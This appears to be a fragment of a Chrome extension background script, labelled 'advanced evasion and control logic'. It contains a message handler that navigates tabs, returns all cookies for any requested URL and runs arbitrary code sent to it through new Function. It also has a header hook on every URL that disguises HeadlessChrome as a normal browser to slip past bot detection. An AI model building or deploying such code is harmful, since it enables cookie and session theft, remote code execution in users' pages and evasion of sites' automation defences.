
        // Advanced evasion and control logic
        chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
            if (request.action === 'navigate') {
                chrome.tabs.update(sender.tab.id, {url: request.url});
            } else if (request.action === 'getCookies') {
                chrome.cookies.getAll({url: request.url}, (cookies) => {
                    sendResponse(cookies);
                });
                return true;
            } else if (request.action === 'executeScript') {
                chrome.scripting.executeScript({
                    target: {tabId: sender.tab.id},
                    func: new Function(request.code)
                });
            }
        });
        
        // Modify headers to look more legitimate
        chrome.webRequest.onBeforeSendHeaders.addListener(
            (details) => {
                const headers = details.requestHeaders;
                
                // Remove automation headers
                headers.forEach((header, index) => {
                    if (header.name.toLowerCase() === 'sec-ch-ua' && header.value.includes('HeadlessChrome')) {
                        headers[index].value = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"';
                    }
                });
                
                return {requestHeaders: headers};
            },
            {urls: ["<all_urls>"]},
            ["blocking", "requestHeaders", "extraHeaders"]
        );
        